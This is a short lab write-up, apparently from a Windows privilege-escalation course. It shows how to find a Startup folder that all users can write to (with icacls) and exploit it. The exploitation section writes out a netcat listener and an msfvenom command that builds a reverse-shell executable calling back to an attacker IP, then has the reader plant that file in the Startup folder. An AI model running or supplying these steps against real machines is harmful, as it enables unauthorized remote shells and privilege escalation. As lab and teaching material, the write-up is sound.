# <span style="color:#FF5555">Startup Applications</span>

## <span style="color:#8BE9FD">Methodology</span>

Startup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start:
+ Run registry keys (HKLM, HKCU, wow64 nodes included)
+ RunOnce registry keys
+ Startup folders under the start menu for per user and public locations

So basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.

## <span style="color:#8BE9FD">Detection</span>

### <span style="color:#50FA7B">Windows VM</span>

1. Open command prompt and type: 
```console
C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
![image](https://user-images.githubusercontent.com/59029171/161051050-c4b5745a-3040-4d65-8146-e67d66a3ffd3.png)

2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.

## <span style="color:#8BE9FD">Exploitation</span>

### <span style="color:#50FA7B">Kali VM</span>

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53  -f exe -o y.exe
```
3. Copy the generated file, `y.exe`, to the Windows VM.

### <span style="color:#50FA7B">Windows VM</span>

1. Place `y.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`.

### <span style="color:#50FA7B">Kali VM</span>

1. Wait for a reverse shell on your kali machine.

